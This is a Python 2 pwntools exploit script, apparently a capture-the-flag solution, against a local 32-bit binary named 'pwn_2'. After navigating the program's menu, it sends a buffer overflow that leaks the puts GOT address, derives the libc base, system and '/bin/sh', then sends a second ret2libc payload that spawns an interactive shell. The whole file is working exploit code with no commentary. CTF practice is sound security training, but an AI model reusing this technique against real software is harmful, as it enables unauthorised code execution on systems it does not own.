#! /usr/bin/env python2
#coding:utf-8
from pwn import *

context.log_level='debug'

vuln_addr = 0x08048659

p = process('./pwn_2')

elf = ELF('./pwn_2')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
# libc = ELF('./libc.so.6')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
printf_got = elf.got['printf']
success('puts_plt:'+hex(puts_plt))
success('puts_got:'+hex(puts_got))
p.recvuntil('>')
p.sendline('Wh4lter')

#defend
p.recvuntil('>')
p.sendline('2')
p.recvuntil('>')
p.sendline('2')
p.recvuntil('>')
p.sendline('2')
p.recvuntil('>')
p.sendline('2')
p.recvuntil('>')
p.sendline('2')
p.recvuntil('>')
p.sendline('2')
#attack
p.recvuntil('>')
p.sendline('1')

print p.recvuntil('story!\n')

# leak address
payload1 = 'A'*0x30 + 'B'*4 + p32(puts_plt) + p32(vuln_addr) + p32(puts_got)
p.sendline(payload1)
p.recvuntil('ending!\n')

puts_addr = u32(p.recv(4))
libc.address = puts_addr - libc.symbols['puts']
system_addr = libc.symbols['system']
binsh_addr = libc.search('/bin/sh').next()

success('puts_addr:'+hex(puts_addr))
success('system_addr:'+hex(system_addr))
success('binsh_addr:'+hex(binsh_addr))

# pwn
p.recvuntil('story!\n')
payload2 = 'A'*0x30 + 'B'*4 + p32(system_addr) + p32(vuln_addr) + p32(binsh_addr)
p.sendline(payload2)

p.interactive()
p.close()